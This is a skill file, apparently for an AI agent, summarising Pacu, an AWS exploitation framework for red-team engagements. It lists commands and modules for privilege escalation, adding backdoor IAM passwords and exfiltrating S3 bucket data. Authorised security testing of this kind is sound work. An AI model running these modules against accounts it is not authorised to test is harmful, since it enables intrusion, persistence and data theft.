---
name: pacu
description: >
  This skill should be used when the user asks about "pacu", "performing AWS
  red-team engagements, privilege escalation, data exfiltration", "persistence
  in AWS accounts". AWS exploitation framework for auditing and attacking
  misconfigured AWS environments.
---

# Pacu

AWS exploitation framework — enumerate, escalate, pivot, and persist in AWS.

## Quick Start

```bash
pip install pacu
pacu

# Configure AWS creds (or use existing ~/.aws/credentials)
set_keys
# Enter access key, secret key, session token

# List modules
ls
# Run a module
run iam__enum_permissions
```

## Key Modules

| Module | Purpose |
|--------|---------|
| `iam__enum_permissions` | Enumerate IAM permissions |
| `iam__privesc_scan` | Find privilege escalation paths |
| `iam__backdoor_users_passwords` | Add backdoor IAM passwords |
| `ec2__enum` | Enumerate EC2 instances |
| `s3__download_bucket` | Download S3 bucket contents |
| `lambda__enum` | Enumerate Lambda functions |
| `cognito__attack` | Attack Cognito user pools |
| `cloudtrail__download_event_history` | Download CloudTrail logs |

## Common Workflows

**Initial enumeration:**
```
run iam__enum_permissions
run ec2__enum
run s3__enum
```

**Privilege escalation:**
```
run iam__privesc_scan
# Follow recommendations from output
```

**Data exfil:**
```
run s3__download_bucket --bucket target-bucket
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | AWS privesc techniques and module args |
